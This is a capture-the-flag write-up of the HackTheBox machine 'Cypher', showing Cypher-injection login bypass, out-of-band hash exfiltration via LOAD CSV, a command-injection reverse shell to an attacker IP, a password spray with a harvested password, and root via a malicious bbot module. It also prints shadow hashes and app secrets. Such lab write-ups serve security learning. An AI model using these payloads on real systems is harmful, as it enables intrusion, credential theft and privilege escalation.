---
render_with_liquid: false
title: HackTheBox Writeup - Cypher
date: 2025-03-06 18:38:24 +1400
tags: [hackthebox, nmap, linux, feroxbuster, neo4j, neo4j-apoc, apk, jadx, decompilation, java, python, cypher-injection, graph-db, cypher-injection-error-based, cypher-injection-oob, auth-bypass, command-injection, discover-history, password-spraying, sudo, bbot, bbot-module]
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/765cd4be6f3a366ca83c7ea60bbcaaa8.png
    width: 640
    height: 480
---



Cypher is a medium-difficulty Linux machine that requires exploiting a cypher injection vulnerability to bypass authentication on a login page. This grants users access to a custom web application to execute custom queries. A Java file is discovered by fuzzing the web application, revealing a command injection vulnerability that provides access to the machine as the `neo4j` user. A history file contains the credentials for the `graphasm` user, who has permission to execute `bbot` as `root` user. This privilege escalation is exploited by creating a custom module that allows executing commands.

# Recon
---

## Hosts

> `pt` command is a **custom pentest framework** to manage hosts and variables, it is not required to reproduce the steps in this writeup
{: .prompt-info }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ pt init '10.10.11.57 cypher.htb'
+---------+--------+-------------+------------+
| PROFILE | STATUS |     IP      |   DOMAIN   |
+---------+--------+-------------+------------+
| cypher  | on     | 10.10.11.57 | cypher.htb |
+---------+--------+-------------+------------+
```

## Nmap

```bash
# Nmap 7.95 scan initiated Thu Mar  6 18:38:23 2025 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.57
Nmap scan report for 10.10.11.57
Host is up, received user-set (0.21s latency).
Scanned at 2025-03-06 18:38:24 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMurODrr5ER4wj9mB2tWhXcLIcrm4Bo1lIEufLYIEBVY4h4ZROFj2+WFnXlGNqLG6ZB+DWQHRgG/6wg71wcElxA=
|   256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEqadcsjXAxI3uSmNBA8HUMR3L4lTaePj3o6vhgPuPTi
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  6 18:38:37 2025 -- 1 IP address (1 host up) scanned in 14.16 seconds
```


## 80 - HTTP : GRAPH ASM


### Info

```ruby
http://cypher.htb [200] [GRAPH ASM] [nginx/1.24.0 (Ubuntu)] [53040d336712e08ab47fe765cce5dc3c00e6b5b1] [Bootstrap,Nginx:1.24.0,Ubuntu,jQuery]
```

![](/assets/obsidian/bd0ec384a719c8a82461f61a60251f39.png)

### Directory

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ URL="http://$(pt get rhost):80"; OUT="$(echo $URL | awk -F':' '{print $NF}' | sed -e 's|[/:]|-|g')"; feroxbuster -k -A -w /usr/share/wordlists/dirb/common.txt -u "$URL" -o "ferox_${OUT}.txt" -C 404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cypher.htb:80
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_80.txt
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        3l      113w     8123c http://cypher.htb/bootstrap-notify.min.js
200      GET      179l      477w     4986c http://cypher.htb/about
200      GET       63l      139w     1548c http://cypher.htb/utils.js
200      GET      126l      274w     3671c http://cypher.htb/login
307      GET        0l        0w        0c http://cypher.htb/demo => http://cypher.htb/login
200      GET        2l     1293w    89664c http://cypher.htb/jquery-3.6.1.min.js
200      GET        7l     1223w    80496c http://cypher.htb/bootstrap.bundle.min.js
200      GET      876l     4886w   373109c http://cypher.htb/logo.png
307      GET        0l        0w        0c http://cypher.htb/api => http://cypher.htb/api/docs
200      GET     7333l    24018w   208204c http://cypher.htb/vivagraph.min.js
200      GET       12l     2173w   195855c http://cypher.htb/bootstrap.min.css
200      GET      162l      360w     4562c http://cypher.htb/
200      GET     5632l    33572w  2776750c http://cypher.htb/us.png
200      GET      162l      360w     4562c http://cypher.htb/index
200      GET      162l      360w     4562c http://cypher.htb/index.html
405      GET        1l        3w       31c http://cypher.htb/api/auth
307      GET        0l        0w        0c http://cypher.htb/api/ => http://cypher.htb/api/api
301      GET        7l       12w      178c http://cypher.htb/testing => http://cypher.htb/testing/
200      GET       17l      139w     9977c http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
[####################] - 25s     9264/9264    0s      found:19      errors:10
[####################] - 22s     4614/4614    207/s   http://cypher.htb:80/
[####################] - 23s     4614/4614    202/s   http://cypher.htb/
[####################] - 1s      4614/4614    7928/s  http://cypher.htb/testing/ => Directory listing (add --scan-dir-listings to scan) 
```


# User Flag
---

## Shell as neo4j


### 80 - GRAPH ASM : Apoc extension APK file leak

> **What is **Apoc extension**?**
> 
> Neo4j 3.x introduced the concept of user-defined procedures and functions. Those are custom implementations of certain functionality, that can’t be (easily) expressed in Cypher itself. They are implemented in Java and can be easily deployed into your Neo4j instance, and then be called from Cypher directly.
{: .prompt-info }

Download APK file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ cd dump

┌──(bravosec㉿fsociety)-[~/htb/Cypher/dump]
└─$ wget http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
--2025-03-08 21:24:32--  http://cypher.htb/testing/custom-apoc-extension-1.0-SNAPSHOT.jar
Resolving cypher.htb (cypher.htb)... 10.10.11.57
Connecting to cypher.htb (cypher.htb)|10.10.11.57|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6556 (6.4K) [application/java-archive]
Saving to: ‘custom-apoc-extension-1.0-SNAPSHOT.jar’

custom-apoc-extension-1.0-SNAPSHOT.jar               100%[===================================================================================================================>]   6.40K  --.-KB/s    in 0.001s

2025-03-08 21:24:36 (7.87 MB/s) - ‘custom-apoc-extension-1.0-SNAPSHOT.jar’ saved [6556/6556]
```

Decompile APK file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher/dump]
└─$ jadx $(realpath custom-apoc-extension-1.0-SNAPSHOT.jar) -d $(realpath jadx_out)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
INFO  - loading ...
INFO  - processing ...
INFO  - done
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher/dump/jadx_out]
└─$ find -L . -type f -exec ls -latrh {} + 2>/dev/null
-rw-r--r-- 1 bravosec kali   81 Mar  8 21:25  ./resources/META-INF/MANIFEST.MF
-rw-r--r-- 1 bravosec kali  573 Mar  8 21:25 './resources/com/cypher/neo4j/apoc/HelloWorldProcedure$HelloWorldOutput.class'
-rw-r--r-- 1 bravosec kali 3.8K Mar  8 21:25  ./resources/com/cypher/neo4j/apoc/CustomFunctions.class
-rw-r--r-- 1 bravosec kali  547 Mar  8 21:25 './resources/com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class'
-rw-r--r-- 1 bravosec kali   79 Mar  8 21:25  ./resources/META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.properties
-rw-r--r-- 1 bravosec kali 1.7K Mar  8 21:25  ./resources/com/cypher/neo4j/apoc/HelloWorldProcedure.class
-rw-r--r-- 1 bravosec kali 1.6K Mar  8 21:25  ./resources/META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml
-rw-r--r-- 1 bravosec kali 2.6K Mar  8 21:25  ./sources/com/cypher/neo4j/apoc/CustomFunctions.java
-rw-r--r-- 1 bravosec kali  963 Mar  8 21:25  ./sources/com/cypher/neo4j/apoc/HelloWorldProcedure.java
```

From `pom.xml` (Project Object Model config that contains info about the project and configuration details), we know that the **neo4j** version is `5.23.0`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher/dump/jadx_out]
└─$ cat ./resources/META-INF/maven/com.cypher.neo4j/custom-apoc-extension/pom.xml
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>com.cypher.neo4j</groupId>
    <artifactId>custom-apoc-extension</artifactId>
    <version>1.0-SNAPSHOT</version>

    <properties>
        <neo4j.version>5.23.0</neo4j.version>
        <maven.compiler.source>11</maven.compiler.source>
        <maven.compiler.target>11</maven.compiler.target>
    </properties>
[...]
```

There's a custom **apoc** function vulnerable to **command injection** via `url` parameter

> `./sources/com/cypher/neo4j/apoc/CustomFunctions.java`

```java
package com.cypher.neo4j.apoc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.util.stream.Stream;
import org.neo4j.procedure.Description;
import org.neo4j.procedure.Mode;
import org.neo4j.procedure.Name;
import org.neo4j.procedure.Procedure;

/* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions.class */
public class CustomFunctions {
    @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
    @Description("Returns the HTTP status code for the given URL as a string")
    public Stream<StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
        if (!url.toLowerCase().startsWith("http://") && !url.toLowerCase().startsWith("https://")) {
            url = "https://" + url;
        }
        String[] command = {"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
        System.out.println("Command: " + Arrays.toString(command));
        Process process = Runtime.getRuntime().exec(command);
        BufferedReader inputReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
        StringBuilder errorOutput = new StringBuilder();
        while (true) {
            String line = errorReader.readLine();
            if (line == null) {
                break;
            }
            errorOutput.append(line).append("\n");
        }
        String statusCode = inputReader.readLine();
        System.out.println("Status code: " + statusCode);
        boolean exited = process.waitFor(10L, TimeUnit.SECONDS);
        if (!exited) {
            process.destroyForcibly();
            statusCode = "0";
            System.err.println("Process timed out after 10 seconds");
        } else {
            int exitCode = process.exitValue();
            if (exitCode != 0) {
                statusCode = "0";
                System.err.println("Process exited with code " + exitCode);
            }
        }
        if (errorOutput.length() > 0) {
            System.err.println("Error output:\n" + errorOutput.toString());
        }
        return Stream.of(new StringOutput(statusCode));
    }

    /* loaded from: custom-apoc-extension-1.0-SNAPSHOT.jar:com/cypher/neo4j/apoc/CustomFunctions$StringOutput.class */
    public static class StringOutput {
        public String statusCode;

        public StringOutput(String statusCode) {
            this.statusCode = statusCode;
        }
    }
}
```


### 80 - Login page : Cypher injection (error-based) (out-of-band)


#### Identify cypher injection

Tested a generic SQLI payload : `admin';#---` in the `username` field, and got error messages indicating that it's a **python app** using **neo4j** as **Graph Database**

> http://cypher.htb/login#

![](/assets/obsidian/7a5250ae02e4e02f025cc28ab90d7e1d.png)

- The request and response for `/api/auth` endpoint

![](/assets/obsidian/485c7e0c15410423a86396b7caa39f13.png)

- Google : `neo4j injection`

> Awesome Cheat sheet - https://pentester.land/blog/cypher-injection-cheatsheet/

![](/assets/obsidian/3b6423327a28c58fd576b9321d3b2bd5.png)

- By testing `LOAD CSV` query, we verified that **out-of-band** interactions are enabled

```bash
x' OR 1=1 LOAD CSV FROM 'http://10.10.14.55/' AS x RETURN x//
```

![](/assets/obsidian/9cfc79e38733a46fa6b069f23a6e0b15.png)

![](/assets/obsidian/3cb5551aad4576d7ad29b30613cbe951.png)


#### Authentication bypass

> The cypher query of the web application to validate credentials

```sql
MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '<USER INPUT>' return h.value as hash
```

- It uses `MATCH` clause to find the  **SHA-1** `hash` of provided username, then compares it with the user provided password that was **SHA-1** hashed

So we can make it return a **SHA-1** hash that we controls to bypass the authentication

First generate a **SHA-1** hash for the password : `x`

```bash
┌──(bravosec㉿fsociety)-[~/www]
└─$ echo -n 'x' | sha1sum
11f6ad8ec52a2984abaafd7c3b516503785c2072  -
```

Then we can login with `' or 1=1 RETURN '11f6ad8ec52a2984abaafd7c3b516503785c2072' as hash//` as username, and `x` as password

![](/assets/obsidian/6f18314659e545bb51d0bbf1ba46eec2.png)

Logged in successfully

![](/assets/obsidian/0f8bba140f87c49e9b61fbcff3ef8bb2.png)


### 80 - Neo4j custom APOC function : Command injection

We are able to use the custom **apoc** function `custom.getUrlStatusCode()` without the `apoc` top level node (`apoc.custom.getUrlStatusCode()`)

![](/assets/obsidian/cc6c431ec046f8dd76fcdf6cb4ea77bc.png)

Working payload :

```sql
CALL custom.getUrlStatusCode('http://10.10.14.55/x')
```

![](/assets/obsidian/e226e27a88ca22d16afb807b68f0048e.png)

![](/assets/obsidian/9968e23a9569664ca8012b5ce3e48e1b.png)

We can now get a shell via **command injection**

Start reverse shell listener

```bash
nc -lvnp 53
```

Start a web server to host reverse shell script

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ PORT="80"; fuser -k "$PORT/tcp" 2>/dev/null; mkdir -p www && echo '/bin/bash -i >& /dev/tcp/10.10.14.55/53 0>&1' > www/index.html && python -m http.server -d www $PORT
 1513476Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Query :

```sql
CALL custom.getUrlStatusCode('$(/bin/bash -c "bash -i >& /dev/tcp/10.10.14.55/53 0>&1")')
```

![](/assets/obsidian/6de77f0634872fb4a627f6b0cbbeb1a5.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ nc -lvnp 53
listening on [any] 53 ...
connect to [10.10.14.55] from (UNKNOWN) [10.10.11.57] 40326
bash: cannot set terminal process group (1421): Inappropriate ioctl for device
bash: no job control in this shell
neo4j@cypher:/$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
neo4j@cypher:/$ ^Z
zsh: suspended  nc -lvnp 53

┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 53
                             export TERM=xterm
neo4j@cypher:/$ stty rows 50 columns 209
neo4j@cypher:/$ id
uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)
```


## From neo4j to graphasm


### Harvesting - Password in command history

```bash
neo4j@cypher:/$ ls -latr ~
total 52
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 licenses
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 import
drwxr-xr-x  2 neo4j adm   4096 Aug 16  2024 certificates
-rw-r--r--  1 neo4j adm     52 Oct  2 15:55 packaging_info
drwxrwxr-x  3 neo4j adm   4096 Oct  8 18:07 .cache
-rw-r--r--  1 neo4j neo4j   63 Oct  8 18:07 .bash_history
lrwxrwxrwx  1 neo4j adm      9 Oct  8 18:07 .viminfo -> /dev/null
drwxr-xr-x  6 neo4j adm   4096 Oct  8 18:07 data
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 products
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 plugins
drwxr-xr-x  2 neo4j adm   4096 Feb 17 16:24 labs
drwxr-xr-x 11 neo4j adm   4096 Feb 17 16:39 .
drwxr-xr-x 50 root  root  4096 Feb 17 16:48 ..
drwxr-xr-x  2 neo4j adm   4096 Mar 10 19:43 run
neo4j@cypher:/$ cat ~/.bash_history
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```


### Password spray

```bash
neo4j@cypher:/$ PASS='cU4btyib.20xtCMCXkBmerhK'; for USER in $(cat /etc/passwd|grep -viE 'false$|nologin$|sync$'|awk -F: '{print $1}'); do (x=$(echo $PASS | su "$USER" -c whoami); if [ "$x" ]; then echo "[+] $USER"; fi) & done
[1] 3444
[2] 3445
[3] 3447
neo4j@cypher:/$ Password: Password: Password: [+] graphasm
```


### 22 - SSH

```bash
┌──(bravosec㉿fsociety)-[~/htb/Cypher]
└─$ sshpass -p 'cU4btyib.20xtCMCXkBmerhK' ssh -o "StrictHostKeyChecking no" graphasm@10.10.11.57
Warning: Permanently added '10.10.11.57' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Mar 11 07:57:11 AM UTC 2025

  System load:  0.0               Processes:             237
  Usage of /:   69.4% of 8.50GB   Users logged in:       0
  Memory usage: 25%               IPv4 address for eth0: 10.10.11.57
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Mar 11 07:57:12 2025 from 10.10.14.55
graphasm@cypher:~$ id
uid=1000(graphasm) gid=1000(graphasm) groups=1000(graphasm)
graphasm@cypher:~$ cat user.txt
722c6a98d76001e8c78f5363589d4ebd
```


# Root Flag
---

## From graphasm to root


### SUDO - bbot : Custom module

`graphasm` can run `/usr/local/bin/bbot` as root

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

`/usr/local/bin/bbot` is a **symlink** to `/opt/pipx/venvs/bbot/bin/bbot`, we don't have full permissions over both of them

```bash
graphasm@cypher:~$ ls -la /usr/local/bin/bbot
lrwxrwxrwx 1 root root 29 Oct  8 18:10 /usr/local/bin/bbot -> /opt/pipx/venvs/bbot/bin/bbot
graphasm@cypher:~$ ls -la /opt/pipx/venvs/bbot/bin/bbot
-rwxr-xr-x 1 root root 222 Oct  8 18:10 /opt/pipx/venvs/bbot/bin/bbot
```

It's a python script that runs **bbot**

```bash
graphasm@cypher:~$ file /opt/pipx/venvs/bbot/bin/bbot
/opt/pipx/venvs/bbot/bin/bbot: Python script, ASCII text executable
```

```bash
graphasm@cypher:~$ vi /opt/pipx/venvs/bbot/bin/bbot
#!/opt/pipx/venvs/bbot/bin/python
# -*- coding: utf-8 -*-
import re
import sys
from bbot.cli import main
if __name__ == '__main__':
    sys.argv[0] = re.sub(r'(-script\.pyw|\.exe)?$', '', sys.argv[0])
    sys.exit(main())
```

[bbot](https://github.com/blacklanternsecurity/bbot) is a all-in-one python tool to automate recon for bug bounties

```bash
graphasm@cypher:~$ bbot
  ______  _____   ____ _______
 |  ___ \|  __ \ / __ \__   __|
 | |___) | |__) | |  | | | |
 |  ___ <|  __ <| |  | | | |
 | |___) | |__) | |__| | | |
 |______/|_____/ \____/  |_|
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc

www.blacklanternsecurity.com/bbot

[INFO] Creating BBOT config at /home/graphasm/.config/bbot/bbot.yml
[INFO] Creating BBOT secrets at /home/graphasm/.config/bbot/secrets.yml
[...]
```

We don't have permissions to modify any files under the **pipx**'s folders, so hijacking libraries isn't possible

```bash
graphasm@cypher:~$ cd /opt/pipx/
graphasm@cypher:/opt/pipx$ find -L . -writable 2>/dev/null
graphasm@cypher:/opt/pipx$
```

We should focus on checking **bbot**'s :

- Public disclosured vulnerability
- What interesting things it can do, such as command execution, file read, file write
- Find vulnerabilities from source codes

From the manuals, we found out that **bbot** can load custom modules from user specific directories

> https://www.blacklanternsecurity.com/bbot/Stable/scanning/configuration/

![](/assets/obsidian/f332871c76bf70b36a74f87eb99196b8.png)

By searching for "how to create a bbot module", we found an module example in the developer manual

> https://www.blacklanternsecurity.com/bbot/Stable/dev/module_howto/#create-the-python-file

![](/assets/obsidian/fea92e370b0e629544df135d56b12949.png)

We can create a module to give `bash` **SETUID** at initialization via `os.system()` in the `setup(self)` function

> `/tmp/whois.py`

```python
from bbot.modules.base import BaseModule
import os


class whois(BaseModule):
    watched_events = ["DNS_NAME"] # watch for DNS_NAME events
    produced_events = ["WHOIS"] # we produce WHOIS events
    flags = ["passive", "safe"]
    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
    options = {"api_key": ""} # module config options
    options_desc = {"api_key": "WhoisXMLAPI Key"}
    per_domain_only = True # only run once per domain

    base_url = "https://www.whoisxmlapi.com/whoisserver/WhoisService"

    # one-time setup - runs at the beginning of the scan
    async def setup(self):
        os.system("chmod u+s /bin/bash")
        self.api_key = self.config.get("api_key")
        if not self.api_key:
            # soft-fail if no API key is set
            return None, "Must set API key"

    async def handle_event(self, event):
        self.hugesuccess(f"Got {event} (event.data: {event.data})")
        _, domain = self.helpers.split_domain(event.data)
        url = f"{self.base_url}?apiKey={self.api_key}&domainName={domain}&outputFormat=JSON"
        self.hugeinfo(f"Visiting {url}")
        response = await self.helpers.request(url)
        if response is not None:
            await self.emit_event(response.json(), "WHOIS", parent=event)
```

Place the module at `/tmp/whois.py`, then create a **preset** config to load modules from `/tmp`

```bash
graphasm@cypher:/tmp$ vi /tmp/whois.py
graphasm@cypher:/tmp$ echo 'module_dirs: ["/tmp/"]' > /tmp/bbot.yml
```

Run **bbot** to load the module as `root`

```bash
graphasm@cypher:/tmp$ sudo bbot -y -t 127.0.0.1 -p /tmp/bbot.yml -m whois
```

![](/assets/obsidian/7f1ea93e0cbb950d1f093bdcd16dca46.png)

Start **bash** with `-p` option to preserve `euid` and `egid` of `root` user, then start a new shell as `root` with the help of **python**'s `os.setuid()` function

```bash
graphasm@cypher:/tmp$ bash -p
bash-5.2# $(which python2 python python3 2>/dev/null | head -n1) -c 'import os;os.setuid(0);os.system("/bin/bash -p")'
root@cypher:/tmp# id
uid=0(root) gid=1000(graphasm) groups=1000(graphasm)
root@cypher:/tmp# cat /root/root.txt
4d2aea5aa73d4e993a6dfe804d0e0af7
```

Cleanup

```bash
root@cypher:/tmp# chmod -s /bin/bash; rm -rf /tmp/whois.py /tmp/bbot.yml
```


# Additional
---


## Post exploitation


### Secrets

```bash
root@cypher:/tmp# awk -F: '$2 ~ /^\$/' /etc/shadow
root:$y$j9T$ianAmmc1w6VSodw.1fzgk/$3DenO5YJ1VBvE1VekRL79v6bN00fhcbA59zeeLciY67:20133:0:99999:7:::
graphasm:$y$j9T$lDLyqZAxCXhX1EB3v01Zl.$C0XwosQvBM.5sAPbHd8oyAK0e8lg0GX5YJHb7qImQV7:20004:0:99999:7:::
```


### Files


#### 80 - /api/ : Source code

- Backend python **fastapi** that runs in docker container on port `8000`

```bash
root@cypher:~# docker ps -a
CONTAINER ID   IMAGE                       COMMAND                  CREATED       STATUS        PORTS                      NAMES
d1313f9003f3   cypher-htb-fastapi:latest   "uvicorn app:app --r…"   2 weeks ago   Up 20 hours   127.0.0.1:8000->8000/tcp   fastapi
```

```bash
root@cypher:~# docker inspect d1313f9003f3 | jq '.[].Mounts.[]' -c
{"Type":"bind","Source":"/root/.setup","Destination":"/app","Mode":"","RW":true,"Propagation":"rprivate"}
```

> `/root/.setup/app.py`

```python
import json
import traceback
from time import sleep
from hashlib import sha1
from datetime import timedelta
from contextlib import suppress

from pydantic import BaseModel

from starlette.responses import Response, RedirectResponse

from fastapi import FastAPI, Depends, Request
from fastapi.responses import HTMLResponse
from fastapi_login import LoginManager
from fastapi_login.exceptions import InvalidCredentialsException


import logging

log = logging.getLogger("gunicorn.error")


from neo4j import GraphDatabase

# Neo4j connection details
URI = "bolt://host.docker.internal:7687"
USERNAME = "neo4j"
PASSWORD = "cU4btyib.20xtCMCXkBmerhK"

### DATABASE ###

# wait for neo4j to come up
while 1:
    try:
        driver = GraphDatabase.driver(URI, auth=(USERNAME, PASSWORD))
        with driver.session() as session:
            session.run("Match () Return 1 Limit 1")
            break
    except Exception:
        log.error(traceback.format_exc())
        sleep(1)


def create_node(tx, label, properties):
    for k,v in dict(properties).items():
        if isinstance(v, dict):
            properties.pop(k)
    query = (
        f"CREATE (n:{label} $properties)"
    )
    tx.run(query, properties=properties)

def create_relationship(tx, src, dst, type):
    query = (
        "MATCH (a), (b) "
        "WHERE a.id = $src AND b.id = $dst "
        f"CREATE (a)-[:{type}]->(b)"
    )
    tx.run(query, src=src, dst=dst)

def run_cypher(cypher):
    with driver.session() as session:
        return [r.data() for r in session.run(cypher)]


### CREATE ADMIN USER ###

for cypher in [
    "CREATE CONSTRAINT uniq_user IF NOT EXISTS FOR (user:USER) REQUIRE user.username IS UNIQUE",
    "CREATE CONSTRAINT uniq_pass IF NOT EXISTS FOR (pass:HASH) REQUIRE pass.value IS UNIQUE",
    "CREATE FULLTEXT INDEX dns_name_data_fulltext FOR (n:DNS_NAME) ON EACH [n.data]",
    """
    MERGE (u:USER {name:'graphasm'})
    MERGE (p:SHA1 {value: '9f54ca4c130be6d529a56dee59dc2b2090e43acf'})
    MERGE (u)-[:SECRET]->(p)
    """
]:
    with suppress(Exception):
        run_cypher(cypher)


### POPULATE DB ###

dns_name = run_cypher("Match (n:DNS_NAME) Return n Limit 1")
if not dns_name:
    with driver.session() as session:
        with open("webroot/sanitized.json", 'r') as file:
            events = list([json.loads(line) for line in file])
            print('creating nodes')
            for event in events:
                session.execute_write(create_node, event["type"], event)
            print('creating relationships')
            for event in events:
                session.execute_write(create_relationship, event["parent"], event["id"], event["module"])


### BASE APP ###

app = FastAPI()


@app.get("/api")
async def root():
    return RedirectResponse("/api/docs")


### SECURITY ###

class NotAuthenticatedException(Exception):
    pass

SECRET = "563e56a8078fab3dd7d3dc1e97d9af498fac07e49479dd9a83b8d028b0145226"

manager = LoginManager(SECRET, token_url="/auth", use_cookie=True, not_authenticated_exception=NotAuthenticatedException)


@app.exception_handler(NotAuthenticatedException)
def auth_exception_handler(request: Request, exc: NotAuthenticatedException):
    """
    Redirect the user to the login page if not logged in
    """
    return RedirectResponse(url="/login")


@app.get("/demo", response_class=HTMLResponse)
async def demo(user=Depends(manager)):
    with open("/app/demo.html", "r") as f:
        return f.read()


@manager.user_loader()
def load_user(username: str):
    # TODO: flesh this out
    return {"username": "graphasm"}


def verify_creds(username, password):
    cypher = (
        f"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '{username}' return h.value as hash"
    )
    try:
        results = run_cypher(cypher)
        if results:
            db_hash = results[0]["hash"]
            password = password.encode(errors="ignore")
            hashed_password = sha1(password).hexdigest()
            if hashed_password == db_hash:
                return True
        return False
    except Exception:
        raise ValueError(f"Invalid cypher query: {cypher}: {traceback.format_exc()}")



class LoginForm(BaseModel):
    username: str
    password: str


@app.post("/api/auth")
def login(loginform: LoginForm):
    username = loginform.username
    password = loginform.password
    try:
        creds_valid = verify_creds(username, password)
    except Exception:
        return Response(traceback.format_exc(), status_code=400)
    if not creds_valid:
        raise InvalidCredentialsException

    token = manager.create_access_token(
        data=dict(sub=username), expires=timedelta(hours=12)
    )
    response = Response("ok")
    response.set_cookie(key=manager.cookie_name, value=token)
    return response


@app.get("/api/cypher")
def get_nodes(query: str):
    if "alter " in query.lower() or "merge " in query.lower():
        return Response("Access denied", status_code=400)
    try:
        return run_cypher(query)
    except Exception:
        return Response(traceback.format_exc(), status_code=400)
```


### Client side activities


#### Keylogging & Clipboard history

```bash

```


#### Browser

```bash

```


#### Files & directories access history

```bash

```


#### Application history

```bash

```


## Cypher injection - Exfiltration (out-of-band)

We can exfiltrate users' password hashes via `LAOD CSV` query

- Payload

```sql
admin' or 1=1 LOAD CSV FROM 'http://10.10.14.111/h/' + h.value as v return v as hash//
```

- Result

```bash
[2025-07-25 18:54:24] 10.10.11.57:52460 "GET /h/9f54ca4c130be6d529a56dee59dc2b2090e43acf HTTP/1.1" 404 19
```

```bash

```